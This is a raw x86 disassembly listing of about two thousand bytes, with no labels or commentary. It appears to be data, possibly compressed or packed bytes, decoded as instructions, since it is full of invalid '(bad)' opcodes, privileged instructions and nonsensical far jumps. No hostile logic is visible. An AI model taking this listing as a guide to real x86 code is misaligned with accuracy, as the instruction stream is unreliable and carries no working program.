  415de6:	in     al,dx
  415de7:	mov    DWORD PTR [ecx-0x27c9aff5],esi
  415ded:	dec    eax
  415dee:	dec    ebx
  415def:	pop    ecx
  415df0:	stc    
  415df1:	push   ds
  415df2:	mov    esi,0x5723427d
  415df7:	test   eax,0xd74dc783
  415dfc:	pop    ecx
  415dfd:	sbb    eax,0x571288b4
  415e02:	pop    eax
  415e03:	inc    esp
  415e04:	iret   
  415e05:	jne    0x415dad
  415e07:	jnp    0x415dcd
  415e09:	dec    ecx
  415e0a:	mov    eax,0xe4c3341c
  415e0f:	xchg   edi,eax
  415e10:	mov    WORD PTR [ebx+0x7002a62e],cs
  415e16:	(bad)  
  415e17:	fisubr WORD PTR [edi+0x78]
  415e1a:	pop    esp
  415e1b:	(bad)  
  415e1c:	cdq    
  415e1d:	repz shr BYTE PTR [ebp+0x38],0xdd
  415e22:	div    BYTE PTR [esi+0x2dbb79db]
  415e28:	mov    esp,0x87a36a3e
  415e2d:	pop    esi
  415e2e:	inc    edi
  415e2f:	inc    ecx
  415e30:	xchg   esp,eax
  415e31:	bound  esp,QWORD PTR [esi]
  415e33:	pusha  
  415e34:	add    ebx,DWORD PTR [edi-0x58]
  415e37:	adc    al,0x6b
  415e39:	out    dx,al
  415e3a:	fs (bad) 
  415e3c:	lds    esi,FWORD PTR [ebx-0x14]
  415e3f:	inc    eax
  415e40:	add    al,0x86
  415e42:	popf   
  415e43:	pop    ss
  415e44:	add    eax,0xfb9dafea
  415e49:	call   0xaca1:0xd3f8b702
  415e50:	ret    0xecf3
  415e53:	mov    edi,0x98c428b1
  415e58:	not    BYTE PTR [eax-0x70]
  415e5b:	inc    ecx
  415e5c:	rcl    DWORD PTR [eax+0x504d8ca2],1
  415e62:	add    ah,BYTE PTR [edx-0x16]
  415e65:	imul   edi,eax,0x40
  415e68:	retf   0x34dc
  415e6b:	out    0xe2,al
  415e6d:	bound  eax,QWORD PTR [ecx-0x31099d94]
  415e73:	pop    ebx
  415e74:	pusha  
  415e75:	in     eax,dx
  415e76:	cmp    eax,0x6fbc9eb
  415e7b:	mov    cl,0xb2
  415e7d:	mov    ds:0x16111724,al
  415e82:	pop    ebx
  415e83:	and    DWORD PTR [edx+ebp*8-0x7084f854],ebx
  415e8a:	repnz out 0xd5,eax
  415e8d:	arpl   WORD PTR [esi+0x31],cx
  415e90:	(bad)  
  415e91:	pop    edi
  415e92:	stos   BYTE PTR es:[edi],al
  415e93:	fsubr  DWORD PTR [ecx+esi*2+0x9]
  415e97:	cld    
  415e98:	add    eax,DWORD PTR [ebp+0x34310cb9]
  415e9e:	or     eax,0xfd727598
  415ea3:	xchg   ecx,eax
  415ea4:	push   es
  415ea5:	pop    eax
  415ea6:	aad    0x58
  415ea8:	popa   
  415ea9:	adc    BYTE PTR [edx],bh
  415eab:	xchg   ebp,eax
  415eac:	push   ds
  415ead:	sub    al,0x33
  415eaf:	fs jmp 0x415e8d
  415eb2:	mov    ch,0x86
  415eb4:	pop    eax
  415eb5:	bound  esp,QWORD PTR [edx+0x25]
  415eb8:	addr16 (bad) 
  415eba:	test   al,0x84
  415ebc:	xor    BYTE PTR [eax],bl
  415ebe:	iret   
  415ebf:	mov    ch,0x75
  415ec1:	push   cs
  415ec2:	pop    eax
  415ec3:	cmp    esp,DWORD PTR [eax+edi*8]
  415ec6:	mov    bl,0xa6
  415ec8:	loope  0x415e53
  415eca:	loopne 0x415e5f
  415ecc:	pop    ss
  415ecd:	ins    DWORD PTR es:[edi],dx
  415ece:	retf   
  415ecf:	out    dx,al
  415ed0:	popa   
  415ed1:	fild   DWORD PTR [eax]
  415ed3:	mov    al,ds:0x6bd6619c
  415ed8:	push   esp
  415ed9:	sar    DWORD PTR [edx-0x3958096f],1
  415edf:	das    
  415ee0:	dec    ecx
  415ee1:	jnp    0x415ed0
  415ee3:	mov    al,ds:0x54cee2f4
  415ee8:	add    eax,0xd6a57460
  415eed:	stc    
  415eee:	outs   dx,DWORD PTR ds:[esi]
  415eef:	or     eax,0x82aa27ea
  415ef4:	and    BYTE PTR [edx-0x71],bh
  415ef7:	scas   al,BYTE PTR es:[edi]
  415ef8:	mov    esp,0x14e288e
  415efd:	jns    0x415e90
  415eff:	scas   al,BYTE PTR es:[edi]
  415f00:	pop    ebp
  415f01:	std    
  415f02:	sar    BYTE PTR [esi+ebp*8],0xc3
  415f06:	mov    eax,ds:0x9cddba9b
  415f0b:	push   0x7a168759
  415f10:	mov    dl,0x3d
  415f12:	sar    DWORD PTR [edi],1
  415f14:	int3   
  415f15:	or     al,0x3f
  415f17:	xchg   BYTE PTR [eax-0x7e7ae72f],dl
  415f1d:	xchg   BYTE PTR [ecx-0x46],ah
  415f20:	and    DWORD PTR [si-0x65],ebx
  415f24:	push   ds
  415f25:	sbb    edx,DWORD PTR [edx+0x42]
  415f28:	call   0x9d43ccfe
  415f2d:	(bad)  
  415f2e:	sti    
  415f2f:	mov    ds:0x1a7970c5,al
  415f34:	int    0x43
  415f36:	aaa    
  415f37:	popa   
  415f38:	inc    ecx
  415f39:	(bad)  
  415f3b:	mul    BYTE PTR [ecx+edx*1-0x27]
  415f3f:	sub    ebp,DWORD PTR [edx]
  415f41:	mov    db6,esp
  415f44:	into   
  415f45:	or     BYTE PTR [ebp+0x6f630da1],0x11
  415f4c:	adc    ecx,ecx
  415f4e:	pushf  
  415f4f:	push   ds
  415f50:	imul   edx,DWORD PTR [ebx-0x6b6a6899],0xc43322d7
  415f5a:	cdq    
  415f5b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415f5c:	mov    gs,ecx
  415f5e:	cmp    DWORD PTR [ecx-0x5b922ffc],ecx
  415f64:	xor    DWORD PTR [ebx-0x7d],ebx
  415f67:	add    bl,ch
  415f69:	lahf   
  415f6a:	xor    ah,BYTE PTR [ebx-0x4]
  415f6d:	push   ebp
  415f6e:	push   ecx
  415f6f:	xor    BYTE PTR [ebp+ebp*2-0x25e35007],bh
  415f76:	fmulp  st(0),st
  415f78:	add    eax,0xdccfba79
  415f7d:	inc    esp
  415f7e:	sbb    al,0xe4
  415f80:	clc    
  415f81:	imul   ecx,esi,0xffffffdd
  415f84:	pop    es
  415f85:	push   eax
  415f86:	or     BYTE PTR [ecx],dl
  415f88:	imul   esp,DWORD PTR [ecx],0xf6d4d134
  415f8e:	(bad)
  415f91:	jbe    0x415f41
  415f93:	hlt    
  415f94:	mov    esp,0xd7c1bfc8
  415f99:	sbb    al,0x3c
  415f9b:	pop    esp
  415f9c:	add    BYTE PTR [eax-0x3],0x1b
  415fa0:	jp     0x415faf
  415fa2:	or     eax,0x7bc624ca
  415fa7:	cs ins BYTE PTR es:[edi],dx
  415fa9:	call   0xe16d:0x97c2b2b0
  415fb0:	stos   BYTE PTR es:[edi],al
  415fb1:	ds loopne 0x415f9d
  415fb4:	inc    DWORD PTR [ecx-0x20a647fc]
  415fba:	lods   al,BYTE PTR ds:[esi]
  415fbb:	icebp  
  415fbc:	mov    ah,0xd6
  415fbe:	add    al,0xe7
  415fc0:	in     eax,0x87
  415fc2:	xor    ch,BYTE PTR [ecx+0xa]
  415fc5:	xor    eax,0x84dc29ac
  415fca:	in     al,dx
  415fcb:	inc    ebp
  415fcc:	add    DWORD PTR [ecx],ebx
  415fce:	mov    ebp,0xcac97e89
  415fd3:	fisubr DWORD PTR [ecx]
  415fd5:	jb     0x415f6c
  415fd7:	add    eax,0xa66aa0c
  415fdc:	xor    al,dl
  415fde:	inc    edx
  415fdf:	mov    bh,0xaa
  415fe1:	cmp    al,0x49
  415fe3:	pop    esi
  415fe4:	push   0x7251eb2f
  415fe9:	cs loope 0x41602d
  415fec:	shr    BYTE PTR [ebx+0x59],cl
  415fef:	push   0x47213fe2
  415ff4:	std    
  415ff5:	xor    BYTE PTR [ebp+eax*8-0x67a2336b],bh
  415ffc:	jno    0x415faf
  415ffe:	and    BYTE PTR [ebx],al
  416000:	mov    cl,0xb2
  416002:	add    DWORD PTR [edx-0x52af0e63],eax
  416008:	cmp    eax,ecx
  41600a:	out    dx,al
  41600b:	ret    
  41600c:	mov    cl,BYTE PTR [edi-0x26e3e635]
  416012:	sbb    ah,BYTE PTR [eax+0x42]
  416015:	mov    BYTE PTR [edi],dl
  416017:	cld    
  416018:	test   DWORD PTR [ecx],esp
  41601a:	xchg   edi,eax
  41601b:	dec    edx
  41601c:	add    dh,dl
  41601e:	pop    esp
  41601f:	cmc    
  416020:	push   es
  416021:	jmp    0xc68e94dd
  416026:	mov    dl,0x65
  416028:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416029:	call   0x30e23459
  41602e:	jg     0x415fd2
  416030:	lahf   
  416031:	inc    ebx
  416032:	pop    ecx
  416033:	sbb    eax,0x9b16b998
  416038:	sub    dl,BYTE PTR [eax+esi*4+0x56774859]
  41603f:	push   es
  416040:	sub    BYTE PTR [ecx-0x4200c329],bh
  416046:	adc    al,0xc6
  416048:	gs call edi
  41604b:	xor    bl,BYTE PTR [ebx+0x115bb9c0]
  416051:	adc    edi,DWORD PTR [ebx]
  416053:	test   eax,0x6023cc8f
  416058:	push   esi
  416059:	sub    ebp,DWORD PTR [ebp-0x4e99b3e3]
  41605f:	inc    eax
  416060:	test   al,0x5b
  416062:	aad    0x69
  416064:	mov    ebx,0x266a1237
  416069:	(bad)  
  41606a:	mov    ah,0x29
  41606c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41606d:	add    BYTE PTR [ecx],cl
  41606f:	dec    eax
  416070:	push   edx
  416071:	and    al,BYTE PTR [edi+esi*8+0x586e029a]
  416078:	out    dx,eax
  416079:	cmp    al,0x25
  41607b:	and    al,0xc6
  41607d:	jp     0x416017
  41607f:	sub    al,BYTE PTR [ecx-0x34]
  416082:	lahf   
  416083:	pop    ecx
  416084:	retf   0xcf47
  416087:	lods   al,BYTE PTR ds:[esi]
  416088:	ficom  DWORD PTR [edi]
  41608a:	clc    
  41608b:	dec    eax
  41608c:	loopne 0x4160b7
  41608e:	mov    al,ds:0xb21b6fad
  416093:	mov    cl,0xac
  416095:	sbb    eax,0xe7b8765
  41609a:	addr16 into 
  41609c:	stos   BYTE PTR es:[edi],al
  41609d:	imul   ecx,DWORD PTR [esi+ebx*8-0x19],0xffffffa2
  4160a2:	push   ds
  4160a3:	sbb    ch,bl
  4160a5:	dec    esp
  4160a6:	cdq    
  4160a7:	jbe    0x416041
  4160a9:	xor    DWORD PTR [edx+0x2f],ecx
  4160ac:	fstp   TBYTE PTR [ebp+0x1b5d1a52]
  4160b2:	cmp    BYTE PTR [eax+0x25],bh
  4160b5:	pop    eax
  4160b6:	xor    al,BYTE PTR [eax]
  4160b8:	stos   BYTE PTR es:[edi],al
  4160b9:	adc    eax,0x6c28be8a
  4160be:	push   edi
  4160bf:	adc    BYTE PTR [edx+0x2],0x12
  4160c3:	dec    esp
  4160c4:	inc    edx
  4160c5:	ds and cl,al
  4160c8:	and    BYTE PTR [edx],0x48
  4160cb:	push   0xffffffe0
  4160cd:	ins    DWORD PTR es:[edi],dx
  4160ce:	push   es
  4160cf:	push   esi
  4160d0:	xor    esi,DWORD PTR [ebp-0x1cdc2be9]
  4160d6:	mov    bh,0x20
  4160d8:	outs   dx,DWORD PTR ds:[esi]
  4160d9:	dec    ebp
  4160da:	(bad)
  4160de:	out    dx,al
  4160df:	sbb    DWORD PTR [ebx+esi*2+0x66b98555],eax
  4160e6:	pop    eax
  4160e7:	data16 jo 0x41608b
  4160ea:	sbb    BYTE PTR [edi+ebx*4],ah
  4160ed:	sub    BYTE PTR [eax],cl
  4160ef:	cmc    
  4160f0:	std    
  4160f1:	adc    dl,0x1a
  4160f4:	sbb    al,0x0
  4160f6:	lahf   
  4160f7:	xor    al,0x1a
  4160f9:	inc    esp
  4160fa:	xchg   edi,eax
  4160fb:	jmp    FWORD PTR [esi+0x678e1260]
  416101:	push   esp
  416102:	dec    edi
  416103:	retf   0xd5da
  416106:	scas   eax,DWORD PTR es:[edi]
  416107:	popf   
  416108:	mov    al,ds:0x7b0a1a66
  41610d:	pop    edx
  41610e:	push   es
  41610f:	xor    BYTE PTR [eax],dl
  416111:	test   eax,0xf9c1356
  416116:	or     dl,BYTE PTR [edx+0x3c31dec5]
  41611c:	adc    DWORD PTR [eax-0x6d],esp
  41611f:	push   ecx
  416120:	pop    ecx
  416121:	das    
  416122:	sub    eax,esi
  416124:	pushf  
  416125:	xchg   edi,eax
  416126:	nop
  416127:	cmp    ebx,DWORD PTR [ebp+esi*4+0x3c]
  41612b:	das    
  41612c:	das    
  41612d:	retf   0x61bb
  416130:	xchg   ebx,eax
  416131:	test   eax,0xe5318ffa
  416136:	add    eax,0x9e8acf19
  41613b:	and    esi,DWORD PTR [esi]
  41613d:	neg    DWORD PTR [ebx+0x17]
  416140:	cmp    dl,BYTE PTR [edi]
  416142:	gs loop 0x4160d2
  416145:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416146:	mov    esi,0x1ea2db08
  41614b:	iret   
  41614c:	sahf   
  41614d:	dec    esi
  41614e:	(bad)  
  41614f:	or     al,0x49
  416151:	mov    ebp,0x8d91e114
  416156:	ds out 0x48,al
  416159:	inc    esi
  41615a:	mov    ebx,0xd05bbcdb
  41615f:	add    eax,0x70dd225b
  416164:	lahf   
  416165:	inc    ebx
  416166:	or     ebp,DWORD PTR [ebx]
  416168:	mov    bh,0x4b
  41616a:	(bad)  
  41616b:	call   0x7e98ac26
  416170:	js     0x4161dd
  416172:	gs ds inc ecx
  416175:	clc    
  416176:	add    edi,DWORD PTR [esi+edi*2]
  416179:	and    BYTE PTR [ecx+esi*8-0x2b],0x44
  41617e:	ins    BYTE PTR es:[edi],dx
  41617f:	sar    DWORD PTR [edi],cl
  416181:	xor    cl,dh
  416183:	cwde   
  416184:	mov    dl,BYTE PTR ds:0x5be3ff43
  41618a:	pop    es
  41618b:	jmp    0x19fc:0xcd5b46df
  416192:	jmp    0x4161ad
  416194:	popf   
  416195:	fld    st(5)
  416197:	(bad)  
  416198:	stc    
  416199:	add    ecx,DWORD PTR [edi]
  41619b:	out    dx,eax
  41619c:	psubd  mm4,QWORD PTR [ecx]
  41619f:	add    BYTE PTR [eax-0x36eb6e8a],bh
  4161a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4161a6:	mov    edi,0x57d152df
  4161ab:	mov    ds:0x8cb0b74d,al
  4161b0:	jle    0x416193
  4161b2:	adc    al,0x87
  4161b4:	cmp    DWORD PTR [edx-0x37],0xffffff93
  4161b8:	cmp    eax,0x11064074
  4161bd:	test   edx,esp
  4161bf:	mov    fs,WORD PTR [esi+0x1d15c70a]
  4161c5:	mov    dl,0xf3
  4161c7:	fadd   st,st(7)
  4161c9:	cmpxchg al,dl
  4161cc:	push   esp
  4161cd:	leave  
  4161ce:	add    BYTE PTR [ecx+ebx*8-0x73],dh
  4161d2:	and    al,0xf1
  4161d4:	xor    BYTE PTR [ecx],0xcf
  4161d7:	xchg   ah,dl
  4161d9:	push   ebp
  4161da:	ret    
  4161db:	aam    0xc1
  4161dd:	add    edx,eax
  4161df:	pop    ebp
  4161e0:	(bad)  [ecx+0x652808b3]
  4161e6:	(bad)  
  4161e7:	lock mov al,0x64
  4161ea:	pop    edi
  4161eb:	sub    dh,bl
  4161ed:	mov    ss,WORD PTR [eax]
  4161ef:	inc    eax
  4161f0:	mov    edi,0x92a7c233
  4161f5:	mov    edx,0xbdf2198b
  4161fa:	pop    esi
  4161fb:	loopne 0x416243
  4161fd:	add    BYTE PTR [edi-0x6a],al
  416200:	xor    BYTE PTR [ecx-0x54bbe64e],dl
  416206:	inc    ebx
  416207:	pop    es
  416208:	mov    BYTE PTR ds:0x7fcac76f,ch
  41620e:	inc    ecx
  41620f:	sub    DWORD PTR [ebx+eax*4],eax
  416212:	push   esi
  416213:	sbb    DWORD PTR [ecx-0x5f293316],ecx
  416219:	outs   dx,BYTE PTR ds:[esi]
  41621a:	shr    BYTE PTR [eax],0xdc
  41621d:	push   esp
  41621e:	mov    edx,0x718121a7
  416223:	in     eax,dx
  416224:	imul   esi,DWORD PTR [edx+ecx*2+0x6cc04549],0x3fa74c3d
  41622f:	lahf   
  416230:	lods   al,BYTE PTR ds:[esi]
  416231:	add    BYTE PTR es:[edi+0x5c],ah
  416235:	pop    edx
  416236:	lahf   
  416237:	aad    0xe4
  416239:	xor    DWORD PTR [edi],0x36
  41623c:	loop   0x4162af
  41623e:	mov    bh,0xc
  416240:	popa   
  416241:	jo     0x416262
  416243:	add    al,0x93
  416245:	mov    edi,0x6fbb3052
  41624a:	or     BYTE PTR [ebp-0x33],0xbb
  41624e:	adc    DWORD PTR [edx],0x25
  416251:	lea    ebx,[eax]
  416253:	xor    ecx,DWORD PTR [edi]
  416255:	xor    esi,DWORD PTR [edx-0x58]
  416258:	sub    DWORD PTR [ebx+0x18037472],ebx
  41625e:	mov    DWORD PTR [ecx],esp
  416260:	les    eax,FWORD PTR gs:[ebp-0x17239463]
  416267:	cmp    al,0x76
  416269:	(bad)  
  41626a:	imul   ebx,DWORD PTR [edx+0x3c],0x896069b
  416271:	push   0x90839680
  416276:	inc    esp
  416277:	xchg   esp,eax
  416278:	(bad)  
  416279:	or     eax,0xde709706
  41627e:	frndint 
  416280:	dec    ebp
  416281:	jecxz  0x41626e
  416283:	jp     0x416285
  416285:	add    ah,BYTE PTR [eax+ecx*4]
  416288:	loop   0x416288
  41628a:	int3   
  41628b:	mov    ?,WORD PTR [eax+0x4c02744b]
  416291:	mov    esp,0x435b4a04
  416296:	sub    BYTE PTR [edx-0x29],0x30
  41629a:	cdq    
  41629b:	mov    ds,WORD PTR [ebx-0x52]
  41629e:	jbe    0x416260
  4162a0:	test   eax,0x1aa98fce
  4162a5:	and    DWORD PTR [eax-0x57],esi
  4162a8:	loopne 0x4162b2
  4162aa:	(bad)  
  4162ab:	inc    esi
  4162ac:	pop    eax
  4162ad:	mov    ah,0x94
  4162af:	push   edi
  4162b0:	mov    ecx,0x4179328e
  4162b5:	and    ah,BYTE PTR [esi-0x70b8ffae]
  4162bb:	lods   eax,DWORD PTR ds:[esi]
  4162bc:	jge    0x416249
  4162be:	les    edx,FWORD PTR [eax+0x1cffc6d5]
  4162c4:	lock xchg ebx,eax
  4162c6:	jo     0x41630c
  4162c8:	sbb    al,0xef
  4162ca:	jmp    0x7eb5:0x751ba0a6
  4162d1:	and    DWORD PTR [ebx+0x74c7e59f],edx
  4162d7:	aas    
  4162d8:	pop    esp
  4162d9:	jbe    0x416287
  4162db:	jge    0x416335
  4162dd:	jp     0x416300
  4162df:	ret    
  4162e0:	daa    
  4162e1:	es xchg esi,eax
  4162e3:	xchg   edx,eax
  4162e4:	cmp    BYTE PTR [edx+0x51],dh
  4162e7:	fistp  QWORD PTR [ebx-0x5d]
  4162ea:	sahf   
  4162eb:	sbb    BYTE PTR [edi-0x9],bh
  4162ee:	test   al,0xab
  4162f0:	dec    edi
  4162f1:	hlt    
  4162f2:	dec    esi
  4162f3:	mov    ebx,0xdafe0c46
  4162f8:	sbb    eax,0x1a3a3123
  4162fd:	or     eax,0x98ec310e
  416302:	dec    ebp
  416303:	fld    DWORD PTR [edx-0x7616dcc6]
  416309:	xor    eax,0x2ba450cd
  41630e:	mov    dl,BYTE PTR [eax]
  416310:	jo     0x4162e1
  416312:	(bad)  
  416314:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416315:	fisub  DWORD PTR [edx+0x60087475]
  41631b:	sbb    BYTE PTR ds:0x8b8a2c36,bl
  416321:	push   edx
  416322:	mov    ds:0xcd773239,al
  416327:	test   eax,0x8431f2d7
  41632c:	adc    DWORD PTR [ebx+0x76],esp
  41632f:	add    eax,DWORD PTR [edi+edx*8+0x70f7c644]
  416336:	call   0x5ace:0x5ef3e205
  41633d:	cmp    ah,BYTE PTR [esi-0xc]
  416340:	aad    0x75
  416342:	iret   
  416343:	cwde   
  416344:	repnz dec eax
  416346:	imul   BYTE PTR [ebp-0x36a8e8cc]
  41634c:	aaa    
  41634d:	fs enter 0x9269,0x82
  416352:	je     0x416394
  416354:	lock shl BYTE PTR [ebx-0x77ed4a83],cl
  41635b:	adc    eax,0x647a47a1
  416360:	mov    BYTE PTR [edi-0x2c],0xff
  416364:	adc    dh,BYTE PTR [esi-0x5e]
  416367:	xchg   BYTE PTR [ecx-0x31a19281],cl
  41636d:	jne    0x416377
  41636f:	jne    0x41636f
  416371:	cmp    dh,al
  416373:	hlt    
  416374:	cmp    eax,0xf6a27ea1
  416379:	mov    dh,0xc1
  41637b:	das    
  41637c:	inc    ebp
  41637d:	fimul  WORD PTR [esi]
  41637f:	or     BYTE PTR [edi-0x7bf25b6d],ah
  416385:	mov    ds:0x283133da,al
  41638a:	mov    ds:0x2bcf49f0,al
  41638f:	jno    0x416410
  416391:	dec    ecx
  416392:	lahf   
  416393:	mov    DWORD PTR [esi+0x1e],ebp
  416396:	hlt    
  416397:	mov    ecx,0x86645ba2
  41639c:	(bad)  
  41639d:	or     dh,ch
  41639f:	clc    
  4163a0:	sbb    BYTE PTR [ebx],bl
  4163a2:	mov    DWORD PTR [ecx],edi
  4163a4:	imul   edi,ebp,0x62a963e1
  4163aa:	mov    WORD PTR [ecx*8-0x3273e879],ss
  4163b1:	(bad)  
  4163b3:	pop    ebp
  4163b4:	lods   eax,DWORD PTR ds:[esi]
  4163b5:	lods   eax,DWORD PTR ds:[esi]
  4163b6:	pusha  
  4163b7:	enter  0x5df1,0x87
  4163bb:	bound  edx,QWORD PTR [edi+edx*4]
  4163be:	jecxz  0x4163d2
  4163c0:	iret   
  4163c1:	mov    ebx,0xe8bfb6fc
  4163c6:	pop    ebp
  4163c7:	ins    DWORD PTR es:[edi],dx
  4163c8:	push   esi
  4163c9:	or     DWORD PTR [ebp+0x4c675db1],eax
  4163cf:	lea    ecx,[edi]
  4163d1:	dec    esi
  4163d2:	neg    BYTE PTR [ebx+0x54ddd90e]
  4163d8:	inc    eax
  4163d9:	popa   
  4163da:	pop    ebx
  4163db:	sbb    bl,al
  4163dd:	sar    DWORD PTR [eax],0x99
  4163e0:	out    dx,eax
  4163e1:	gs jns 0x416410
  4163e4:	sub    eax,0xbe7dda20
  4163e9:	push   eax
  4163ea:	bound  ebp,QWORD PTR [esi+0x3e]
  4163ed:	cmp    dh,ch
  4163ef:	mov    al,ds:0x759f75d6
  4163f4:	add    eax,0xee44f03d
  4163f9:	adc    eax,DWORD PTR ds:[edi-0x8]
  4163fd:	jne    0x4163fa
  4163ff:	(bad)  
  416400:	aad    0x9b
  416402:	adc    al,0x79
  416404:	push   0xfdd2589b
  416409:	in     al,dx
  41640a:	xor    bl,cl
  41640c:	mul    DWORD PTR [eax]
  41640e:	popf   
  41640f:	add    eax,0x2fa061bb
  416414:	dec    esp
  416415:	outs   dx,BYTE PTR ds:[esi]
  416416:	mov    eax,0xdf9bced
  41641b:	sbb    al,0x89
  41641d:	jmp    0x416411
  41641f:	pop    edi
  416420:	sub    bh,BYTE PTR [ecx+edi*1-0x6f]
  416424:	cli    
  416425:	push   edx
  416426:	fldcw  WORD PTR [ebx-0x24]
  416429:	popf   
  41642a:	or     eax,0xdeb5339
  41642f:	adc    eax,0x2668762f
  416434:	addr16 dec edi
  416436:	mov    BYTE PTR [ebx],dh
  416438:	jno    0x4163c2
  41643a:	ja     0x41646c
  41643c:	dec    esp
  41643d:	in     al,dx
  41643e:	cmp    al,0xfa
  416440:	adc    BYTE PTR [esi],al
  416442:	stos   BYTE PTR es:[edi],al
  416443:	push   eax
  416444:	jmp    0xad6b0b8f
  416449:	push   esi
  41644a:	sub    eax,0xea9172a4
  41644f:	inc    edx
  416450:	stc    
  416451:	or     dh,BYTE PTR [esi+0x13]
  416454:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416455:	jae    0x416469
  416457:	xchg   esp,eax
  416458:	sub    DWORD PTR [ecx-0x4e],esi
  41645b:	fdivr  QWORD PTR [esi-0x41]
  41645e:	jb     0x416423
  416460:	stos   BYTE PTR es:[edi],al
  416461:	dec    edx
  416462:	jge    0x416444
  416464:	jns    0x416480
  416466:	pop    ds
  416467:	stc    
  416468:	jge    0x4163fa
  41646a:	add    BYTE PTR [edi+0x3d],al
  41646d:	icebp  
  41646e:	xor    ch,BYTE PTR [ebp+0x78]
  416471:	push   ss
  416472:	sbb    esi,ebp
  416474:	sar    ebp,cl
  416476:	jns    0x41644f
  416478:	iret   
  416479:	xor    al,0xfd
  41647b:	push   ss
  41647c:	(bad)  
  41647d:	adc    esp,DWORD PTR [esi+0x5a0cfc89]
  416483:	xor    eax,0x98135b80
  416488:	mul    DWORD PTR [ebp+0x196b9380]
  41648e:	sbb    eax,0x7dc8b6b4
  416493:	xor    eax,0x6171fe86
  416498:	stc    
  416499:	loop   0x41645d
  41649b:	or     DWORD PTR [di+0x3610],ebp
  4164a0:	xor    DWORD PTR [edx],ebx
  4164a2:	mov    ds:0x7dcb5838,eax
  4164a7:	jle    0x416430
  4164a9:	mov    ecx,0x8f731e9b
  4164ae:	ja     0xf86d3071
  4164b4:	ss in  eax,0x51
  4164b7:	sti    
  4164b8:	inc    eax
  4164b9:	mov    ebx,0x1b3225df
  4164be:	mov    WORD PTR [edi+ebx*8-0x35],es
  4164c2:	loope  0x41653d
  4164c4:	push   esi
  4164c5:	mov    ebp,0xaeed5198
  4164ca:	mov    ebx,0x8aa8fce1
  4164cf:	mov    edx,0x7f3b5470
  4164d4:	(bad)  
  4164d5:	call   0xb86d:0x8556a3aa
  4164dc:	pop    ebx
  4164dd:	cli    
  4164de:	inc    edi
  4164df:	mov    ah,0x94
  4164e1:	in     eax,dx
  4164e2:	or     edx,ebx
  4164e4:	(bad)
  4164e8:	dec    ebx
  4164e9:	sbb    BYTE PTR [edi+0x31c68ad8],bh
  4164ef:	movlhps xmm5,xmm5
  4164f2:	mov    BYTE PTR [edi],0x47
  4164f5:	fidivr WORD PTR [edx-0x37]
  4164f8:	(bad)  
  4164f9:	fild   WORD PTR [edi]
  4164fb:	jge    0x416510
  4164fd:	push   es
  4164fe:	pop    ss
  4164ff:	bound  edx,QWORD PTR [edi+0x3b11227f]
  416505:	mov    bh,0x83
  416507:	fs hlt 
  416509:	jno    0x41655e
  41650b:	or     eax,0xe686096
  416510:	dec    ebx
  416511:	fs stos DWORD PTR es:[edi],eax
  416513:	jae    0x4164f6
  416515:	inc    edi
  416516:	nop
  416517:	sti    
  416518:	je     0x41656c
  41651a:	test   BYTE PTR fs:[eax+ebx*2],dh
  41651e:	and    DWORD PTR [esi-0x6],ebx
  416521:	xchg   ebp,eax
  416522:	int    0x27
  416524:	xor    edx,eax
  416526:	sub    al,0xe1
  416528:	loopne 0x41655f
  41652a:	mov    DWORD PTR [edi-0x11],esi
  41652d:	loopne 0x41658d
  41652f:	popf   
  416530:	rcr    BYTE PTR [ebx],1
  416532:	xchg   ebx,eax
  416533:	out    0x61,al
  416535:	and    edx,DWORD PTR [ebx+0x305e826e]
  41653b:	add    esp,esi
  41653d:	call   0x49ef:0xf6ce0aee
  416544:	xor    DWORD PTR [eax],0x3fa5d1a4
  41654a:	aad    0xb2
  41654c:	enter  0xe33c,0xbb
  416550:	add    DWORD PTR [eax+0x7ac45b49],ebx
  416556:	icebp  
  416557:	mov    bl,dl
  416559:	sub    ebx,DWORD PTR [ecx+0x12]
  41655c:	mov    esi,0x3d61673a
  416561:	fucomp st(0)
  416563:	js     0x4164f4
  416565:	jnp    0x416558
  416567:	mov    dl,0x32
  416569:	mov    dh,0xa9
  41656b:	xor    edx,DWORD PTR es:[eax-0x6fd5d41e]
  416572:	addr16 pop esi
  416574:	call   0x2e4f:0xdc9bc56d
  41657b:	mov    cl,0xa8
  41657d:	mov    edx,0x5f4e8cc9
  416582:	adc    eax,0xd11ec92
  416587:	(bad)  
  416588:	fucomip st,st(5)
  41658a:	sbb    eax,0x736ce99e
  41658f:	pop    esp
  416590:	stos   DWORD PTR es:[edi],eax
  416591:	sti    
  416592:	int    0x7c
  416594:	leave  
  416595:	jp     0x4165a5
  416597:	fucomi st,st(1)
  416599:	retf   
  41659a:	jle    0x416548
  41659c:	mov    WORD PTR [ecx+0x229a4726],cs
  4165a2:	xchg   ebp,eax
  4165a3:	bound  eax,QWORD PTR [eax-0x41]
  4165a6:	xchg   edx,eax
  4165a7:	push   0x7c855d6f
  4165ac:	and    eax,0x9f929c2
  4165b1:	shl    DWORD PTR [edx],cl
  4165b3:	xor    ah,0xd7
  4165b6:	in     al,dx
  4165b7:	push   0x2c179cd3
  4165bc:	sbb    eax,0x739f63df
  4165c1:	mov    ah,0xdb
  4165c3:	psubq  mm7,QWORD PTR [esi]
  4165c6:	loope  0x41662a
  4165c8:	push   0x14
  4165ca:	jge    0x416550
  4165cc:	cmp    eax,0x130c1731
  4165d1:	sub    BYTE PTR [edx],bh
  4165d3:	mov    ebx,0x97c3206a
  4165d8:	mov    ebp,0x4317cc66
  4165dd:	or     BYTE PTR [ebp-0x57],ah
  4165e0:	scas   eax,DWORD PTR es:[edi]
  4165e1:	mov    ah,0x46
  4165e3:	inc    edx
  4165e4:	cmp    eax,0x2e455bee
  4165e9:	ret    0xc67b
  4165ec:	add    eax,0x85f5c56a
  4165f1:	or     al,0xff
  4165f3:	jmp    0x416632
  4165f5:	dec    edi
  4165f6:	test   al,0xfe
  4165f8:	pop    ebp
  4165f9:	repz out dx,eax
  4165fb:	mov    eax,ds:0x286d12e5
  416600:	sbb    BYTE PTR [edx+0x3377ff87],0x1a
  416607:	xor    esp,edi
  416609:	mov    bl,0x58
  41660b:	ins    DWORD PTR es:[edi],dx
  41660c:	dec    ecx
  41660d:	and    eax,0x60fe4bc0
  416612:	push   esp
  416613:	jbe    0x41663e
